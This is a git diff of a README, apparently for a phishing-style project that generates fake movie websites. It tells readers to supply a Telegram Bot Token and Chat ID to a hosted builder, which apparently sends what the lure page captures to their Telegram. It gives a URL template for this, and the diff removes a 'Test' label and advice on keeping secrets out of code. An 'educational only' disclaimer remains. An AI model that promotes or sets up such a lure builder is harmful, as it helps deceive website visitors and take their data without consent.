@@ -17,11 +17,11 @@ Hackers create fake websites and use **social engineering** to manipulate users 
 
 ---
 
-## ⚙️ Build Your Own Test Site
+## ⚙️ Build Your Own Site
 
 Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
 
-[▶️ Launch Test Site](https://cinemaxhub.vercel.app/)
+> [▶️ Launch Test Site](https://cinemaxhub.vercel.app/)
 
 ---
 
@@ -30,8 +30,6 @@ Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** o
 1. **Get Your Telegram Bot Token** and **Chat ID** by following this tutorial:
 
 > https://youtube.com/shorts/ZvCdiTS-uGw
-
-2. Store both values securely as environment variables or GitHub Secrets—**never** hard-code them.
 
 ---
 
@@ -44,13 +42,11 @@ Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** o
 
 ---
 
-## 📋 Quick API Snippet
+## 📋 Quick API
 
 ```bash
-# Copy and paste this in your terminal:
-curl "https://cinemaxhub.vercel.app/movie.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID"
+https://cinemaxhub.vercel.app/movie.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
 ```
+> ⚠️ **Replace** `YOUR_TOKEN` and `YOUR_CHAT_ID` with your actual Telegram Bot Token and Chat ID.
 
 > **⚠️ Warning:** This project is **educational only**. Do **not** engage in unauthorized access or use for malicious purposes. **Always obtain explicit consent** before performing any security testing.
-
----
